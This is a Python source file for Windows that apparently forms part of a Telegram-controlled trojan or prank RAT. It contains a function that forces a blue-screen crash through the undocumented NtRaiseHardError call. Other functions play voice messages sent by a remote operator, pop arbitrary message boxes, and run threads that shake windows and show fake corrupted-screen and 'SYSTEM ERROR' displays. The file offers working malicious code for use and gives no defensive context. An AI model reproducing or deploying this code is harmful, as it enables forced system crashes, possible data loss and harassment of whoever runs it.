import ctypes, av, wave, os, subprocess, time, pygetwindow as gw, pyautogui, cv2, numpy as np, threading, random
from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll
from PIL import ImageGrab

def bsod():
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

def SendMessage(Mtitle, Mtext, Micon, Mbutton):
    ctypes.windll.user32.MessageBoxW(
        0, 
        Mtext, 
        Mtitle,
        Mbutton | Micon
    )

def VoiceMsgPlaying(message, bot):
    try:
        if message.content_type == 'voice':
            FileInfo = bot.get_file(message.voice.file_id)
            VoiceFile = bot.download_file(FileInfo.file_path)

            oggPath = f"voice_{message.message_id}.ogg"
            with open(oggPath, 'wb') as f:
                f.write(VoiceFile)

            os.system(f'start /min "" "{oggPath}"')

            time.sleep(message.voice.duration + 1)
            os.remove(oggPath)
            return True
        else:
            return False

    except PermissionError:
        PermissionError()
      
    except Exception as e:
        bot.send_message(chat_id, f"Error: {e}")

def start_glitch(duration_seconds):
    stop_event = threading.Event()

    def glitch_window_loop():
        while not stop_event.is_set():
            windows = [w for w in gw.getWindowsWithTitle('') if w.visible and w.title]
            for win in windows:
                dx = random.randint(-10, 10)
                dy = random.randint(-10, 10)
                try:
                    win.moveTo(win.left + dx, win.top + dy)
                except:
                    pass
            time.sleep(0.05)

    def glitch_screen_loop():
        while not stop_event.is_set():
            img = np.array(ImageGrab.grab((0, 0, pyautogui.size().width, pyautogui.size().height)))
            rows = img.shape[0]
            for _ in range(int(rows * 0.03)):
                y = random.randint(0, rows - 2)
                img[y] = img[y + 1]
            if random.random() > 0.8:
                img = 255 - img
            cv2.imshow("Critical Error", img)
            cv2.waitKey(1)
            time.sleep(0.05)

    def scroll_screen_loop():
        scroll_offset = 0
        while not stop_event.is_set():
            img = np.array(ImageGrab.grab())
            scroll_offset += 2
            if scroll_offset > img.shape[0]:
                scroll_offset = 0
            scrolled = np.zeros_like(img)
            scrolled[scroll_offset:] = img[:img.shape[0] - scroll_offset]
            cv2.imshow("Critical Error", scrolled)
            cv2.waitKey(1)
            time.sleep(0.03)

    def random_msgbox_loop():
        while not stop_event.is_set():
            if random.random() < 0.01:
                ctypes.windll.user32.MessageBoxW(
                    0,
                    "SYSTEM ERROR: 0xC0000022\nYour PC ran into a problem and needs to restart.",
                    "Critical Error",
                    0x10
                )
            time.sleep(1)

    threads = [
        threading.Thread(target=glitch_window_loop, daemon=True),
        threading.Thread(target=glitch_screen_loop, daemon=True),
        threading.Thread(target=scroll_screen_loop, daemon=True),
        threading.Thread(target=random_msgbox_loop, daemon=True)
    ]
    for t in threads:
        t.start()

    time.sleep(duration_seconds)

    stop_event.set()
    time.sleep(0.5)
    cv2.destroyAllWindows()
